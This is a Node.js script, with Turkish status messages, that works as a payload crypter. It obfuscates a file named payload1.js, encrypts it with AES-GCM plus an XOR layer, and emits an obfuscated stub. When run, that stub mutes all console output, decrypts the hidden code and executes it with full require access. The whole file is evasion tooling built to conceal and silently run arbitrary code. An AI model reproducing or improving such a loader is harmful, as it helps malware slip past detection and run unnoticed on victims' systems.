const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const JSConfuser = require('js-confuser');

function generateRandomKey() {
    return crypto.randomBytes(32);
}

const randomName = process.argv[2];

function generateRandomXorKey() {
    return crypto.randomBytes(32)[0];
}

function encrypt(text, key) {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()]);
    const tag = cipher.getAuthTag();
    return Buffer.concat([iv, tag, encrypted]).toString('base64');
}

function xor(bytes, key) {
    return bytes.map(byte => byte ^ key);
}

const inputFile = path.join(__dirname, 'payload1.js');
const outputFile = path.join(__dirname, 'script', `${randomName}`);

const jsconfuseroption = {
    target: 'node',
    calculator: true,
    compact: true,
    hexadecimalNumbers: true,
    controlFlowFlattening: 0.5,
    deadCode: 0.50,
    dispatcher: true,
    duplicateLiteralsRemoval: 0.75,
    flatten: true,
    globalConcealing: true,
    identifierGenerator: 'randomized',
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.75,
    renameVariables: true,
    renameGlobals: true,
    shuffle: true,
    variableMasking: 0.75,
    stringConcealing: true,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: 0.75,
    astScrambler: true,
    pack: true,
    renameLabels: true,
    preserveFunctionLength: true
};

const jsconfuseroption2 = {
    target: 'node',
    calculator: true,
    controlFlowFlattening: 0.25,
    deadCode: 0.1,
    dispatcher: 0.5,
    globalConcealing: true,
    identifierGenerator: 'randomized',
    movedDeclarations: true,
    objectExtraction: true,
    renameVariables: true,
    renameGlobals: true,
    shuffle: true,
    variableMasking: 0.5,
    stringConcealing: true,
    stringSplitting: 0.25,
    renameLabels: true,
    opaquePredicates: true
};

async function main() {
    const originalCode = fs.readFileSync(inputFile, 'utf8');
    const obfedcode = await JSConfuser.obfuscate(originalCode, jsconfuseroption);

    const key = generateRandomKey();
    const xorKey = generateRandomXorKey();

    const encryptedCode = encrypt(obfedcode.code, key);
    const encryptedBytes = Array.from(Buffer.from(encryptedCode));
    const xorEncryptedBytes = xor(encryptedBytes, xorKey);
    const finalObfuscatedCode = Buffer.from(xorEncryptedBytes).toString('base64');

    console.log("Şifreleme tamamlandı!");

    const outputCode = `
const crypto = require('crypto');
console.log = () => {};
console.error = () => {};
console.warn = () => {};
console.info = () => {};

const _0O0O0o = (O00Oo0, o0O0o0) => O00Oo0.map(Oo0Oo0 => Oo0Oo0 ^ o0O0o0);

const oO0Oo0 = (Oo0OoO, OOo0o0) => {
    const o0O0oO = Buffer.from(Oo0OoO, 'base64');
    const O0o0O0 = o0O0oO.slice(0, 12);
    const o0oo00 = o0O0oO.slice(12, 28);
    const OoOo0O = o0O0oO.slice(28);
    const O0o0oO = crypto.createDecipheriv('aes-256-gcm', OOo0o0, O0o0O0);
    O0o0oO.setAuthTag(o0oo00);
    const o0O0Oo = Buffer.concat([O0o0oO.update(OoOo0O), O0o0oO.final()]);
    return o0O0Oo.toString('utf8');
};

const _0oOo0O = ${xorKey};
const _Oo0OoO = Buffer.from('${key.toString('base64')}', 'base64');
const _OoO0o0 = '${finalObfuscatedCode}';

const _o0O0o0 = Array.from(Buffer.from(_OoO0o0, 'base64'));
const _OO0Oo0 = _0O0O0o(_o0O0o0, _0oOo0O);
const _0Oo0O0 = Buffer.from(_OO0Oo0).toString('utf8');
const _0O0o0O = oO0Oo0(_0Oo0O0, _Oo0OoO);
new Function('require', _0O0o0O)(require);
`;

    const outputObfcode = await JSConfuser.obfuscate(outputCode, jsconfuseroption2);
    fs.writeFileSync(outputFile, outputObfcode.code);
    console.log(`Şifrelenmiş dosya ${outputFile} olarak kaydedildi!`);
}

main();